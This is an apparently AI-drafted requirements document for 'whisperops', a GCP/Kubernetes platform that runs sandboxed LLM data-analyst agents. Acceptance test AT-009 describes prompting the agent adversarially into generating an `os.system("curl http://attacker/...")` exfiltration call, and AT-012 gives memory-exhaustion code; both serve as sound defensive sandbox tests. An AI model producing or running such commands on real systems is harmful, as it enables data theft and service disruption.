# DEFINE: whisperops (Dataset Whisperer Platform)

> A self-service internal developer platform that ships isolated, governed, observable Data Analyst agents over curated datasets — built to study modern AI Platform Engineering technologies end-to-end.

## Metadata

| Attribute | Value |
|-----------|-------|
| **Feature** | whisperops |
| **Product Name (consumer-facing)** | Dataset Whisperer |
| **Date** | 2026-05-04 |
| **Author** | define-agent (validate-and-capture from BRAINSTORM_whisperops.md) |
| **Status** | Ready for Design |
| **Clarity Score** | 15/15 |
| **Source Inputs** | [BRAINSTORM_whisperops.md](BRAINSTORM_whisperops.md), [notes/PLAN_dataset-whisperer.md](../../../notes/PLAN_dataset-whisperer.md) |

> **Naming convention:** SDD slug `whisperops` for filenames; product name "Dataset Whisperer" for UX surfaces (Backstage template title, chat brand, agent identifier prefix `agent-{name}-{xyz}`).

---

## Problem Statement

Operating LLM agents in production has become its own discipline: costs are non-deterministic, prompts drift in quality without testing, agents have outsized blast radius if access controls fail, and observability requires its own LLM-aware toolchain on top of standard infra observability — and most teams reinvent solutions to all of these in isolation. **whisperops** is an end-to-end study of what a coherent platform addressing these concerns looks like, composing CNCF-aligned IDP construction (CNOE/idpBuilder, Backstage, ArgoCD, Gitea), a Kubernetes-native agent runtime (kagent + A2A), declarative cloud provisioning (Crossplane), policy-as-code (Kyverno), LLM observability (Langfuse Cloud), infra observability (LGTM in-cluster), and per-agent isolation into a single working system that ships useful Data Analyst agents through a 4-field Backstage form.

---

## Target Users

| User | Role | Pain Point |
|------|------|------------|
| **Project author / platform engineer (you)** | Primary builder & learner | Existing references cover individual technologies (Backstage, kagent, Crossplane, Langfuse) but not their *composition* into a coherent IDP. Needs a working reference system to study end-to-end. |
| **Developer creating a Dataset Whisperer agent** | In-scenario consumer of the platform | Doesn't want to choose vector DB, embedding model, chunking strategy, source URL, or budget — wants the platform to decide and just ship a working agent. |
| **Non-technical end user of an agent** | Asks dataset questions in chat | Wants natural-language data answers with chart + explanation + transparent code, without writing SQL or Python. |
| **Future maintainer / reference reader** | Reviews or extends the project later | Wants a documented architecture with explicit residual risks, not hidden ones; wants a trail of *why* each technology was chosen. |

---

## Goals

| Priority | Goal |
|----------|------|
| **MUST** | One-command deploy (`make deploy`) provisions full stack on a fresh GCP project in under 20 minutes |
| **MUST** | Backstage 4-field form (name, description, dataset, primary LLM) creates a working Dataset Whisperer agent in under 90 seconds (PR merge → chat-ready) |
| **MUST** | Per-agent isolation: dedicated namespace, dedicated GCS bucket, dedicated GCP service account, all named `agent-{name}-{xyz}` with 3-char random suffix; SA key mounted only in the agent's namespace |
| **MUST** | 3-agent A2A squad per Dataset Whisperer (Planner=Haiku fixed, Analyst=developer-selected, Writer=developer-selected) — three distinct A2A spans visible in Langfuse traces, tagged with the agent's full identifier |
| **MUST** | Sandbox service: pool of 1-2 pre-warmed pods in dedicated `sandbox` namespace; per-execution credential injection (no shared SA keys); 60s timeout, 3GB memory cap, read-only FS except `/tmp`, NetworkPolicy egress-only-to-GCS |
| **MUST** | All three curated datasets reachable from agents via shared, read-only Terraform-provisioned bucket (`{project-id}-datasets`); platform works with manually-uploaded CSVs |
| **MUST** | Crossplane *active in MVP* — provisions per-agent GCS bucket, GCP SA, SA key, and IAM bindings declaratively from Backstage-template-generated CRDs |
| **MUST** | Two-pane observability: Langfuse Cloud (LLM ops) + Grafana/LGTM (infra ops); Grafana Infinity panel pulls Langfuse aggregate cost into a platform-wide cost dashboard |
| **MUST** | Kyverno policy bundle enforced on agent namespaces (resource limits, non-root, no privileged, image registry allowlist, egress allowlist) — at least one demonstrably blocked bad config |
| **MUST** | Per-agent budget enforcement: Langfuse-tag-driven 80% alert + 100% kill switch (scale agent deployment to zero) |
| **MUST** | `make destroy` cleanly tears down all GCP infrastructure including all per-agent Crossplane-managed resources, idempotent |
| **SHOULD** | CI smoke evals on Agent CRD PRs: structural validation + 1 fixed test question per dataset, latency < 30s, gate merge on pass |
| **SHOULD** | End-to-end OTel trace per query spans browser → ingress → planner → analyst → sandbox → writer → ingress → browser, queryable in Tempo |
| **SHOULD** | Streaming responses: Writer output streams token-by-token via SSE through chat frontend |
| **COULD** | Pre-computed dataset profile JSON committed to git (`src/platform-bootstrap/profiles/*.json`) — reduces bootstrap-pod runtime work to a no-op when profiles already exist |
| **COULD** | Grafana dashboards beyond the four required (platform-health, agent-cost, agent-performance, sandbox-execution) — e.g., per-agent drilldown, error-mode taxonomy |

---

## Success Criteria

Measurable outcomes (numbers required):

- [ ] `make deploy` succeeds on a fresh GCP project in **≤ 20 minutes** wall-clock from `git clone` to "all surfaces reachable"
- [ ] Backstage form submission → agent ready-to-chat in **≤ 90 seconds** (PR merge → first successful chat response)
- [ ] End-to-end chat query latency: **p50 ≤ 15s**, **p95 ≤ 30s** for all three datasets across both Haiku and Sonnet
- [ ] Per-query cost: **≤ $0.04 with Sonnet**, **≤ $0.01 with Haiku** (validated against Langfuse cost rollup)
- [ ] Each provisioned agent has exactly **1 namespace + 1 GCS bucket + 1 GCP SA + 1 SA key**, all named `agent-{name}-{xyz}`, all reconciled by Crossplane (verified via `kubectl` and `gcloud`)
- [ ] Langfuse trace per query contains **exactly 3 A2A spans** (Planner, Analyst, Writer), each tagged with the full agent identifier
- [ ] Grafana renders **4 dashboards** with non-empty data within 5 minutes of platform deploy: platform-health, agent-cost, agent-performance, sandbox-execution
- [ ] Kyverno blocks **≥ 1 demonstrable bad agent config** (e.g., a pod missing resource limits) in CI smoke eval
- [ ] Per-agent budget kill switch demonstrably scales agent deployment to **0 replicas** when synthetic budget-exceed scenario triggers
- [ ] `make destroy` returns the GCP project to its pre-deploy state in **≤ 10 minutes**, with **0 leftover** Crossplane-provisioned buckets / SAs / keys (verified via `gcloud storage buckets list` and `gcloud iam service-accounts list`)
- [ ] Total resource consumption stays within `e2-standard-8` VM (32 GB / 8 vCPU): **idle ≤ 10 GB / 3 vCPU**, **query-burst ≤ 13 GB / 4 vCPU**
- [ ] Sandbox executions: **0% credential leakage** between agents (each execution receives only the requesting agent's SA key, discarded after); validated by injecting a test credential and asserting it's not present in subsequent unrelated executions
- [ ] All 3 curated datasets are readable from any agent's sandbox via the shared bucket signed URL within **≤ 5 seconds** of bucket population (manual upload completes → first agent query succeeds)

---

## Acceptance Tests

| ID | Scenario | Given | When | Then |
|----|----------|-------|------|------|
| **AT-001** | Fresh-project deploy (happy path) | A fresh GCP project, `gcloud` auth'd, age key placed, `secrets/*.enc.yaml` decryptable | `make deploy` runs to completion | All surfaces reachable: Backstage, ArgoCD, Gitea, Grafana, Keycloak; smoke tests pass; `kubectl get applications -n argocd` shows all Synced/Healthy; **deploy takes ≤ 20 min** |
| **AT-002** | Manual dataset upload populates shared bucket | Terraform has provisioned `gs://{project-id}-datasets`; bucket is empty | Operator runs `gcloud storage cp california-housing.csv online-retail.csv spotify-tracks.csv gs://{project-id}-datasets/` | All 3 CSVs are present; first agent query against each dataset succeeds within 5s of upload; agents' SAs have `roles/storage.objectViewer` and can read |
| **AT-003** | Agent provisioning via Backstage (happy path) | Platform deployed; operator logged into Backstage via Keycloak; datasets uploaded | Operator fills 4-field form (name=`spotify-explorer`, description, dataset=`spotify-tracks`, model=`Haiku`) and submits | A PR is opened against `agents/{agent-name}-{xyz}/` in Gitea; CI smoke eval passes; on merge, ArgoCD syncs in ≤ 90s; namespace `agent-spotify-explorer-a7k`, bucket `{project-id}-agent-spotify-explorer-a7k`, SA `agent-spotify-explorer-a7k@...`, and chat at `agent-spotify-explorer-a7k.{IP}.sslip.io` exist and are healthy |
| **AT-004** | End-to-end query with chart (happy path) | Agent provisioned; chat URL open | User asks "what's the correlation between danceability and popularity in this dataset?" | Streaming response within 15s p50; response contains: factual summary, Python code block (syntax-highlighted), inline chart (PNG or interactive Plotly); Langfuse shows 1 trace with 3 A2A spans tagged with agent identifier |
| **AT-005** | Sandbox executes Python in isolation | Agent has selected an analysis plan; Sandbox pool has ≥ 1 idle pod | Analyst POSTs code + dataset signed URL + agent's SA key to Sandbox `/execute` | Sandbox runs code in fresh subprocess with per-execution creds, writes chart to `/tmp`, uploads to per-agent bucket via signed URL, returns `{stdout, signed_chart_url, error?}`; subprocess credentials not retained after response |
| **AT-006** | Kyverno blocks a non-compliant agent config | Platform deployed with Kyverno policies in `enforce` mode | Operator commits an Agent manifest missing `resources.limits` to Gitea | CI smoke eval fails with explicit Kyverno violation message; PR cannot merge; if force-applied via kubectl, admission webhook rejects |
| **AT-007** | Per-agent budget kill switch fires | Agent with budget annotation; Langfuse tag tracking accumulated cost | Synthetic load drives accumulated cost past 100% of declared budget | Alert at 80%; at 100%, controller scales agent's Deployment(s) to 0 replicas; chat URL returns 503; Grafana cost dashboard shows the breach event |
| **AT-008** | Cross-agent isolation (negative test) | Two agents `agent-a-xxx` and `agent-b-yyy` both deployed | Operator from `agent-a-xxx`'s namespace attempts to read `gs://{project-id}-agent-b-yyy/` using `agent-a-xxx`'s SA key | Read fails with 403 (`storage.objects.get` denied); Kyverno NetworkPolicy also blocks any pod-to-pod traffic from `agent-a-xxx` namespace to `agent-b-yyy` namespace |
| **AT-009** | LLM-generated malicious code is bounded | Adversarial test prompt designed to make Analyst generate `os.system("curl http://attacker/...")` | Code is submitted to Sandbox | Sandbox NetworkPolicy denies egress to non-GCS endpoints; subprocess `os.system` may run but cannot reach external host; OOM/timeout caps still apply; trace shows the attempt |
| **AT-010** | `make destroy` cleanly removes everything | Platform deployed with ≥ 1 agent provisioned | `make destroy` runs to completion | Terraform removes VM, networks, IPs, shared buckets; Crossplane (before VM teardown) reconciles deletion of all per-agent buckets and SAs; `gcloud storage buckets list --filter='name~^{project-id}-agent-'` returns empty; `gcloud iam service-accounts list --filter='email~^agent-'` returns empty |
| **AT-011** | Streaming chat (SSE) | Agent provisioned; chat open | User submits a question | First response token visible in browser within 3s of submit; tokens stream until Writer completes; chart renders inline once produced |
| **AT-012** | Resource-limit guardrail in sandbox | Adversarial code: `pd.DataFrame({'x': range(10**9)})` (~7 GB) | Submitted to Sandbox | OOM-killer terminates subprocess; Sandbox returns `{error: "memory limit exceeded"}` within 10s; pool pod itself is unaffected and serves next request |
| **AT-013** | Two-pane observability bridge | Several queries run | Operator opens Grafana "Agent Cost" dashboard | Total LLM cost panel (sourced via Grafana Infinity from Langfuse REST API) shows non-zero current-period cost matching Langfuse's own dashboard within ±5% |

---

## Out of Scope

Explicitly NOT in this MVP (each is a deliberate decision; see BRAINSTORM §"Features Removed"):

- **Local dev mode** (`make dev-up` on laptop kind) — cloud-only is the project stance
- **Multi-cloud / cloud-portable abstractions** — GCP-specific, deliberately
- **LiteLLM gateway / multi-provider routing** — deferred to v0.4
- **Self-hosted Langfuse / vector DB / SaaS components** — operational overhead with no functional gain at this volume
- **LLM-as-judge quality evals at platform level** — structural smoke evals only; quality eval needs labeled good-answers per agent which doesn't generalize
- **External notification integrations** (Slack/Discord/email) — synchronous request/response system has no async events
- **Curated knowledge bases beyond dataset profiles** — LLMs already know data analysis patterns; KB would reproduce that with maintenance overhead
- **Open-ended dataset URLs** — deferred to v0.5; per-agent bucket already provisioned today is forward-compatible
- **Automated dataset download by bootstrap pod** — replaced by Terraform-provisioned bucket + manual upload (see Decision D-001 below)
- **Workload Identity** — kind has no GKE metadata service; SA keys are the substitute; deferred to v0.4 GKE migration
- **Image signing via cosign** — Kyverno can verify; signing toolchain itself deferred to v0.4
- **HA / multi-node cluster** — single-node kind in single VM; deferred to GKE migration
- **Hand-crafted Agent YAML** — Backstage template is the only way to create agents
- **General-purpose chat UI** — purpose-built for "user asks dataset question, gets text + chart"
- **Additional Backstage form fields beyond the 4 specified** — re-adding knobs is regression
- **Provider-agnostic abstractions in code** — "It's GCP. Hardcode it."
- **Expanding agent MCP tool surface** beyond `dataset.read_profile`, `sandbox.execute_python`, `langfuse.log_observation`

---

## Constraints

| Type | Constraint | Impact |
|------|------------|--------|
| **Technical** | Single-node kind cluster on a single GCE `e2-standard-8` VM | No HA; pod restart = brief downtime; total resource budget ~10 GB idle / 13 GB query-burst (must fit in 32 GB / 8 vCPU) |
| **Technical** | No Workload Identity (kind has no GKE metadata service) | Per-agent GCP SA keys are used; documented residual risk; Crossplane defs structured to swap `ServiceAccountKey` for `IAMPolicyMember` in a future GKE world |
| **Technical** | Two-tier IaC boundary: Terraform owns the cloud floor only; Crossplane owns per-agent resources | Terraform creates: VM, VPC/firewall/static-IP, **shared datasets bucket**, terraform-state bucket, bootstrap SA. Everything else (per-agent buckets, SAs, IAM bindings, SA keys) is Crossplane-via-ArgoCD. Don't blur this line. |
| **Technical** | Datasets bucket is **populated manually** in MVP (operator uploads 3 CSVs by hand) | Bootstrap pod no longer downloads datasets; instead it (optionally) generates profile JSON from already-uploaded data. Removes failure modes from upstream URL rot, rate limiting, and credential management for source mirrors. See Decision D-001. |
| **Technical** | Working directory is **not yet a git repository** | First action in /design or /build must be `git init` plus authoring `.gitignore` (excludes age key, terraform local state, `node_modules/`, `.env*`) and `.sops.yaml`. Greenfield project — every artifact in source plan §4 must be authored. |
| **Technical** | Agent MCP tool surface bounded to 3 tools: `dataset.read_profile`, `sandbox.execute_python`, `langfuse.log_observation` | Adding tools is a deliberate decision, not a casual change |
| **Technical** | Backstage form is exactly 4 fields | Re-adding knobs is regression |
| **Technical** | Sandbox image bakes whitelisted Python packages; runtime `pip install` blocked | Defense-in-depth; package set must be agreed at /design time |
| **Technical** | Dataset profile schema is a build-graph dependency edge | Profile JSON schema must be locked before Planner agent prompts can be authored |
| **Resource (cost)** | Project must stay within GCP $300 free credits + free tiers of Anthropic, OpenAI, Supabase, Langfuse Cloud | Spot VMs during dev; bounded query volume; no self-hosted SaaS |
| **Resource (people)** | Single developer (project author) | Sequencing matters; tasks that block others (e.g., dataset profile schema) get priority |
| **Timeline** | No external deadline (learning project) | But scope is pinned at v0.3; v0.4+ explicitly out-of-scope |
| **Security** | Secrets must be SOPS-encrypted in git; age key never committed; In-cluster, secrets mounted as files (not env vars) where possible; Per-agent SA keys live only in the agent's namespace | All secrets pass through External Secrets Operator into agent namespaces explicitly; cross-namespace access denied by default |
| **Process** | Backstage template is the only path to creating agents | Hand-crafted Agent YAML during dev is a process anti-pattern; if the template can't produce a config, fix the template |
| **Process** | All agent prompts and Kyverno policies are committed to git and reviewed via PR | No live-edit of in-cluster agent configs |

---

## Technical Context

> Essential context for /design — prevents misplaced files and missed infrastructure needs.

| Aspect | Value | Notes |
|--------|-------|-------|
| **Deployment Location** | New top-level dirs (greenfield): `terraform/`, `platform/` (helmfile + ArgoCD apps + Crossplane defs + Helm charts + observability), `backstage-templates/dataset-whisperer/`, `src/sandbox/` (Python+FastAPI), `src/chat-frontend/` (TypeScript+Next.js), `src/platform-bootstrap/` (Python), `secrets/` (SOPS-encrypted), `tests/` (smoke + eval), `docs/`, `.github/workflows/` | Layout is fully specified in source plan §4; /design adopts verbatim |
| **KB Domains** | `k8s-platform-engineer` (Helm charts, kind config, Argo Rollouts where applicable), `observability-engineer` (LGTM, OTel Collector, Langfuse OTel exporter, dashboards, SLOs), `infra-deployer` (Terraform modules, GCS state backend, GCE VM, networking), `ci-cd-specialist` (GitHub Actions for CI smoke evals; ArgoCD app-of-apps), `python-developer` (sandbox FastAPI, platform-bootstrap), `typescript-developer` (Next.js chat frontend, MSAL not applicable), `genai-architect` (3-agent A2A design, prompt structure for Planner/Analyst/Writer), `extraction-specialist` (dataset profile generation, structured Pydantic outputs), `kb-architect` (Kyverno policy bundle authoring) | /design matches each agent to file-manifest entries |
| **IaC Impact** | **New Terraform resources** (root tier): VPC + firewall + static external IP + DNS via sslip.io; GCE `e2-standard-8` VM with startup script (Docker, idpBuilder); **shared datasets bucket** (`{project-id}-datasets`, regional, versioned, lifecycle disabled); Terraform state bucket (`{project-id}-tfstate`, versioned); bootstrap SA (scoped IAM for Crossplane to manage `agent-*` buckets and SAs only). **New Crossplane resources** (per-agent tier, generated by Backstage template): `Bucket`, `ServiceAccount`, `ServiceAccountKey`, `IAMMember` ×2 (read shared datasets bucket, admin own bucket). | Two-tier IaC must stay strict — see Decision D-002 |
| **Cluster topology** | Single-node kind cluster inside the VM; `idpBuilder create` provisions Backstage, ArgoCD, Gitea, Keycloak, Crossplane core, External Secrets Operator, NGINX Ingress, cert-manager. Platform layer adds: Crossplane provider-gcp, kagent, LGTM, OTel Collector, Kyverno, Sandbox pool | All platform-layer additions are Helm-via-Helmfile orchestrated by ArgoCD app-of-apps |
| **Secrets** | SOPS+age encryption in git; External Secrets Operator syncs into agent namespaces. Required SOPS files (committed encrypted): `anthropic.enc.yaml`, `openai.enc.yaml`, `supabase.enc.yaml`, `langfuse.enc.yaml`, `crossplane-gcp-creds.enc.yaml` | Age key distributed out-of-band; placed by operator at `~/.config/sops/age/keys.txt` before `make deploy` |
| **External SaaS** | Anthropic API (LLM), OpenAI API (`text-embedding-3-small` only), Supabase (Postgres + pgvector for `dataset_profiles`, `analysis_history`), Langfuse Cloud (LLM traces + cost rollup) | All free-tier or low-cost; one-time project setup in each, API keys placed in SOPS files |
| **Networking & DNS** | Static external IP; DNS via sslip.io wildcard (`*.{IP}.sslip.io`); cert-manager + Let's Encrypt HTTP-01; NGINX Ingress splits hosts | No per-agent cloud LB or DNS record; all done via in-cluster Ingress |
| **Two-pane observability** | Langfuse Cloud (authoritative for LLM ops) + LGTM in-cluster (authoritative for everything else) + Grafana Infinity panel (bridge for aggregate cost) | Don't merge into one pane |

**Why This Matters:**

- **Location** → /design uses the source-§4 layout; prevents misplaced files
- **KB Domains** → /design pulls correct patterns from `.claude/kb/{ai-ml,aws,...}` (note: this is a GCP project despite the AWS KB existing — pull from `gcp` patterns where they exist; cross-reference `aws` only for Terraform module idioms)
- **IaC Impact** → Triggers full Terraform planning and Crossplane Composition design upfront; avoids "it works locally" failures

---

## Decisions Made During /define

> New decisions or clarifications that *change or extend* the source plan / brainstorm. Pre-existing locked decisions are catalogued in BRAINSTORM_whisperops.md §"Key Decisions Made" (D-001 through D-020 inherited).

| ID | Decision | Rationale | Source |
|----|----------|-----------|--------|
| **D-001** | **Datasets bucket is Terraform-provisioned and manually populated.** Operator uploads the 3 curated CSVs (California Housing, Online Retail, Spotify Tracks) to `gs://{project-id}-datasets/` by hand using `gcloud storage cp`. Bootstrap pod no longer fetches datasets from upstream URLs. | Removes a class of upstream-mirror failure modes (rate limits, URL rot, credential mgmt for sources). For a learning project, manual upload is acceptable and auditable. The bootstrap pod's *profile generation* responsibility is preserved; only the *download* responsibility is removed. | New (this /define session, user direction) |
| **D-002** | **Two-tier IaC boundary is strict and documented.** Terraform owns: VM, network, static IP, shared datasets bucket, terraform-state bucket, bootstrap SA, project-level IAM bindings for the bootstrap SA. Crossplane (via ArgoCD-applied CRDs from Backstage template) owns: per-agent bucket, per-agent SA, per-agent SA key, per-agent IAM bindings (read shared datasets, admin own bucket). | Carrying this rule explicitly forward prevents /design from accidentally putting per-agent buckets in Terraform (which would defeat the GitOps-everything goal) or putting the shared datasets bucket in Crossplane (which would create a chicken-and-egg with the bootstrap SA). | Clarified from BRAINSTORM (made strict here) |
| **D-003** | **Bootstrap pod's role is profile generation only (post-D-001).** It reads the 3 CSVs from the shared datasets bucket, computes profile JSON + embeddings, writes profiles to Supabase pgvector and (optionally) commits the JSON files back to the platform repo for caching. | After D-001 removes the download responsibility, the bootstrap pod could be deleted entirely if profiles are pre-committed. Keeping it preserves the "platform self-bootstraps from a fresh project" property and makes profile regeneration a pod restart, not a manual step. | Derived from D-001 |
| **D-004** | **Manual dataset upload is part of `make deploy` flow, not implicit.** The Makefile prints a clear, ordered prompt after Terraform completes: "Datasets bucket created at `gs://{project-id}-datasets`. Upload the 3 CSVs now: `gcloud storage cp california-housing.csv online-retail.csv spotify-tracks.csv gs://{project-id}-datasets/`. Press Enter to continue." Or accepts a `DATASETS_LOCAL_DIR` env var that the Makefile uploads automatically if set. | Without this, an operator runs `make deploy`, the bootstrap pod fails on missing datasets, and they get a confusing crash. Making the upload a first-class deploy step preserves the "one-command deploy" goal while honoring D-001's manual-upload constraint. | New (this /define session) |
| **D-005** | **Datasets bucket has uniform read access for all agent SAs via a Crossplane `IAMMember` per agent**, not a project-level binding. | Per-agent IAM scoping (audit traceability + atomic deletion) is preserved; agents created later get their `objectViewer` binding via their own Crossplane composition, not by mutating a shared resource. | Clarification of source plan §3.3 |
| **D-006** | **`git init` is the very first build step.** /design must produce a task that runs `git init`, authors `.gitignore` (excludes `~/.config/sops/age/`, `terraform.tfstate*`, `.terraform/`, `node_modules/`, `.env*`, `__pycache__/`, `dist/`, `build/`), and authors `.sops.yaml` before any other artifact is committed. | Working directory is currently not a git repo; the GitOps loop, SOPS, and Backstage scaffolder all assume a versioned tree. | New (this /define session) |
| **D-007** | **CI smoke evals run in GitHub Actions, not in Gitea CI.** Gitea is the in-cluster GitOps source-of-truth; GitHub holds the platform repo and runs CI. | Source plan implies this in §4 (`.github/workflows/`) but doesn't state it. Explicit here so /design doesn't accidentally try to set up Gitea Actions. | Clarification |

---

## Assumptions

Assumptions that, if wrong, could invalidate the design:

| ID | Assumption | If Wrong, Impact | Validated? |
|----|------------|------------------|------------|
| **A-001** | The 3 datasets fit comfortably in a single GCS bucket and load into a 3GB-cgroup-limited pandas process for typical analyses (worst case ~1.5GB peak per source plan §2.5) | If actual peak exceeds 3GB on representative queries, sandbox memory limit must increase or query patterns must be restricted | [ ] (validate by loading Online Retail + a groupby+merge+pivot during /build smoke test) |
| **A-002** | Anthropic Haiku 4.5 and Sonnet 4.6 (current models per system context, May 2026) generate reliable Python code with pandas/numpy/scipy/sklearn/matplotlib/plotly given a structured Planner-output prompt | If Analyst's code-gen quality is poor, the platform produces broken charts and the demo loses credibility | [ ] (validate by running 5 representative queries per dataset during /design's prompt iteration) |
| **A-003** | Crossplane's `provider-gcp` reconciles new buckets, SAs, and SA keys within ~30-60s (per source plan §3.5) | If reconciliation is significantly slower (e.g., minutes), the "≤ 90s PR-merge-to-chat-ready" goal misses | [ ] (validate during /build by timing first agent provisioning) |
| **A-004** | The kagent controller and A2A protocol implementation are stable enough at v0.3 (or whatever the current release is in May 2026) for production-style use without forking | If kagent has show-stopping bugs or breaking changes, the project either pins an older version or contributes upstream — both of which add timeline | [ ] (validate by deploying a minimal kagent demo before /build commits to the full design) |
| **A-005** | Langfuse Cloud free tier (50k observations/month) is enough for development volume (~10-15 observations per query × ~50-200 dev queries) | If exceeded, switch to Langfuse paid tier or self-host (rejected); cost dashboards may show partial data | [ ] (estimate from query-pattern baseline; monitor during /build) |
| **A-006** | Single-node kind on `e2-standard-8` (32 GB / 8 vCPU) holds platform + 1-3 agents + sandbox burst within budget (~13 GB / 4 vCPU peak per source plan §6.4) | If actual usage exceeds VM capacity, must move to a larger VM (still within free credits with adjustments) or to multi-node | [ ] (load-test during /build smoke phase) |
| **A-007** | sslip.io wildcard DNS resolution is reliable for an external IP through the demo period | If sslip.io has downtime or rate-limits, fall back to manual `/etc/hosts` entries — annoying but not blocking | [ ] (low risk; sslip.io has been reliable historically) |
| **A-008** | The 3 curated datasets (California Housing, Online Retail UCI, Spotify Tracks) remain freely downloadable to the operator's laptop for the manual upload step | If sources move or require auth, operator must source equivalents | [ ] (validate by downloading once at start of /build) |
| **A-009** | Per-agent budget enforcement via Langfuse-tag-driven controller scaling has a feedback loop short enough to prevent runaway cost (target: detect breach + scale-to-zero within ≤ 60s) | If detection is slow, budget overruns silently | [ ] (validate with synthetic load test during /build) |
| **A-010** | Anthropic / OpenAI / Supabase / Langfuse free-tier ToS allow this study-project usage pattern | If any provider's ToS is violated, switch providers or upgrade tier | [ ] (review ToS once during /build setup) |

**Note:** A-001, A-002, A-003, A-006 are the highest-impact assumptions — validate before / early in /build.

---

## Clarity Score Breakdown

| Element | Score (0-3) | Notes |
|---------|-------------|-------|
| Problem | **3** | Specific (LLM ops as a discipline); names the four sub-problems (cost, drift, blast radius, observability); names the 4 user types; ties to a study/learning goal with a concrete output |
| Users | **3** | Four distinct user types with explicit pain points; primary user (project author) clearly distinguished from in-scenario users (developer, end user) and lifecycle users (future maintainer) |
| Goals | **3** | 11 MUSTs, 3 SHOULDs, 2 COULDs, all phrased as testable outcomes with prioritization rationale baked into the source plan |
| Success | **3** | 12 success criteria, every one quantified (time, cost, resource, count); maps directly to acceptance tests AT-001 through AT-013 |
| Scope | **3** | 17-item out-of-scope list with explicit reasoning; 16 process/technical/cost/timeline constraints; 7 in-DEFINE decisions plus 20 inherited from BRAINSTORM |
| **Total** | **15/15** | |

---

## Open Questions

The following do not block /design but should be resolved during it:

1. **Backstage template scaffolder language**: NJK (Nunjucks) is the source plan default (§4 lists `.njk` files). Confirm during /design that this matches the current Backstage scaffolder version, or substitute the current default templating language.
2. **Crossplane Composition vs. raw CRDs in the Backstage template**: source plan §4 shows raw `Bucket`, `ServiceAccount`, `IAMMember` CRDs in the skeleton. /design should decide whether to wrap these in a single `XAgentResources` Composition (cleaner template, more Crossplane authoring) or emit raw CRDs (more template plumbing, less Crossplane investment). Recommendation: raw CRDs in MVP, wrap into Composition in v0.4.
3. **Bootstrap pod profile-generation: ad-hoc Python or a first-class agent?** D-003 keeps the bootstrap pod, but its internal design (a CronJob? a one-shot Job? a kagent Agent itself?) is a /design decision. Recommendation: one-shot Job that runs once per platform deploy and is rerunnable on demand.
4. **Random suffix generation location**: Backstage scaffolder action vs. a Crossplane composition function. Source plan implies scaffolder. Confirm during /design.
5. **Streaming protocol between Writer agent and chat frontend**: SSE (source plan default) vs. WebSocket. SSE is sufficient and matches Next.js App Router patterns; confirm.
6. **kagent OTel exporter target**: source plan implies dual-export to Tempo and Langfuse. Confirm whether this is a single OTel Collector pipeline with two exporters or two separate exporter configs in kagent.

---

## Revision History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-05-04 | define-agent | Initial version. Captured BRAINSTORM_whisperops.md inputs. Added Decisions D-001 through D-007: Terraform-owned + manually-populated datasets bucket; strict two-tier IaC boundary; bootstrap pod scope reduced to profile generation; manual upload as first-class deploy step; per-agent IAM via Crossplane; `git init` as first build step; CI in GitHub Actions. |

---

## Next Step

**Ready for:** `/design .claude/sdd/features/DEFINE_whisperops.md`
